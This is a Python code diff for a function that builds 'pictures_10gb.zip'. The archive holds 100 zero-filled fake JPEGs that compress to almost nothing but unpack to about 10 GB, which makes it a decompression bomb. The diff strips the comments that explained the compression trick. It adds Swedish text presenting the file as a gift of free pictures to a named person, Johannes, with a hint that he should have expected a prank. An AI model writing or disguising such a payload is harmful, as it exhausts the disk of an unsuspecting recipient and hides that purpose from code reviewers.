@@ -62,13 +62,16 @@ def laddaturtle():
 
 
     OUTPUT_ZIP = "pictures_10gb.zip"
-    
-    # 10 GB total, split across files of 100 MB each = 100 files
+    # Read Me !!!!
+
+    # Du får gratis 10 gb av bilder😊😊 varsogod Johannes!!!(Bli inte sur om det funkar, du borde förväntat dig sånt här...)
+
+    # Read Me !!!!
+
     NUM_FILES = 100
     FILE_SIZE_BYTES = 100 * 1024 * 1024  # 100 MB per file
     TOTAL_GB = (NUM_FILES * FILE_SIZE_BYTES) / (1024 ** 3)
     
-    # Minimal valid JPEG header + repetitive filler — compresses extremely well
     JPEG_HEADER = bytes([
         0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46,
         0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01,
@@ -76,7 +79,6 @@ def laddaturtle():
     ])
     JPEG_FOOTER = bytes([0xFF, 0xD9])
     
-    # Repetitive payload that compresses to almost nothing
     FILLER = b"\x00" * (FILE_SIZE_BYTES - len(JPEG_HEADER) - len(JPEG_FOOTER))
     FAKE_JPEG = JPEG_HEADER + FILLER + JPEG_FOOTER
     
